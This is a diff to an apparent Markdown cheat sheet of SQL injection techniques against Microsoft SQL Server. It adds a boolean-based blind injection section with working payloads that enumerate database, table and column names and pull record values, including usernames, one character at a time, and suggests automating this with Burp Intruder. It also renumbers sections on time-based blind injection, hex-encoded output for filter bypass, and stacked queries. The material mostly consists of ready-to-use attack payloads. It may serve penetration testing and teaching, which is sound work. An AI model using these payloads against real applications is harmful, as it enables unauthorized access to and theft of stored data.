@@ -180,8 +180,53 @@ SELECT username, password FROM users WHERE username='' UNION SELECT NULL, name F
 > Tip: column count and data types in the `UNION SELECT` must match the original query — use `ORDER BY n` or trial-and-error with `NULL` placeholders to find the correct column count first.
 
 ---
+ 
+## 9. Boolean-Based (Blind) Injection
+ 
+Unlike error-based injection, boolean-based blind injection doesn't rely on visible error messages or UNION output — it relies on the application behaving differently (e.g. a different page, response length, or presence/absence of content) depending on whether the injected condition is `TRUE` or `FALSE`.
+ 
+### Baseline true/false test
+ 
+```sql
+' AND 1=1--
+' AND 1=2--
+```
+ 
+If the response for `1=1` differs from the response for `1=2` (e.g. content returned vs. a generic/blank page), the parameter is likely boolean-based injectable.
+ 
+### Enumerate database name (char-by-char)
+ 
+```sql
+' AND (SELECT SUBSTRING((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROW ONLY),1,1)) = 'E'--
+```
+> Increment the `OFFSET` to move to the next database, and iterate the character position (`SUBSTRING(...,1,1)` → `SUBSTRING(...,2,1)` etc.) and the comparison character to reconstruct the full name — good candidate for automation with Burp Intruder / a small script.
+ 
+### Enumerate table name (char-by-char)
+ 
+```sql
+' AND (SELECT SUBSTRING((SELECT table_name FROM EmployeesDb.information_schema.tables ORDER BY table_name OFFSET 0 ROWS FETCH NEXT 1 ROW ONLY),1,1)) = 'E'--
+```
+ 
+### Enumerate column name (char-by-char)
+ 
+```sql
+' AND (SELECT SUBSTRING((SELECT column_name FROM EmployeesDb.information_schema.columns WHERE table_name='Employees' ORDER BY table_name OFFSET 0 ROWS FETCH NEXT 1 ROW ONLY),1,1)) = 'r'--
+```
+ 
+### Read record values (char-by-char)
+ 
+```sql
+' AND (SELECT SUBSTRING((SELECT TOP 1 name FROM Emp ORDER BY name),1,1)) = 'B'--
+ 
+' AND (SELECT SUBSTRING((SELECT username FROM users ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROW ONLY),1,1)) = 'A'--
+```
+ 
+> As with time-based extraction, this is a per-character brute force: fix the row via `OFFSET`, fix the character position via the second `SUBSTRING` argument, and iterate the comparison value (`A`-`Z`, `0`-`9`, symbols) until the condition flips from false to true, then move to the next character.
+ 
+---
 
-## 9. Time-Based Blind Injection
+
+## 10. Time-Based Blind Injection
 
 ```sql
 IF (SUBSTRING(DB_NAME(), 1, 1) = 'O') WAITFOR DELAY '00:00:05';
@@ -199,7 +244,7 @@ IF (SUBSTRING((SELECT username FROM users ORDER BY username OFFSET 0 ROWS FETCH 
 
 ---
 
-## 10. Hex Encoding Output
+## 11. Hex Encoding Output
 
 Useful for bypassing filters or safely transporting binary/string data through error messages.
 
@@ -216,7 +261,7 @@ SELECT CONVERT(INT, CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), (SELECT DB_NAM
 
 ---
 
-## 11. Additional Techniques Worth Testing
+## 12. Additional Techniques Worth Testing
 
 ### Stacked queries
 MSSQL supports statement chaining with `;`, which is significant for injection testing:
